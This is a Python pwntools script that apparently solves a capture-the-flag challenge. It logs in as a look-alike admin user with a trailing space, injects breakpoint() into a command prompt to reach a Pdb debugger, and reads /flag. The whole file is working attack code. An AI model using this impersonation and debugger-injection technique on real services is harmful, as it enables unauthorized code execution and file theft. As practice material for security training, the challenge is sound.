from pwn import remote

r = remote('challenges.ctf.compfest.id', 20010)

r.sendlineafter(b'Choice: ', b'2')
r.sendlineafter(b'Username: ', b'cf-min ')
r.sendlineafter(b'Password: ', b'admin')

session_key = r.recvline().strip().decode()
session_key = session_key.split('Your session key: ')[1].encode()

r.sendlineafter(b'Choice: ', b'1')
r.sendlineafter(b'Select: ',b'2')
r.sendlineafter(b'Session key: ', session_key)

r.sendlineafter(b'Choice: ', b'1')
r.sendlineafter(b'Input command: ', b'breakpoint()')

r.sendlineafter(b'(Pdb) ', b'import os')
r.sendlineafter(b'(Pdb) ', b'print(open("/flag").read())')

flag = r.recvline().strip().decode()
r.close()

print(flag)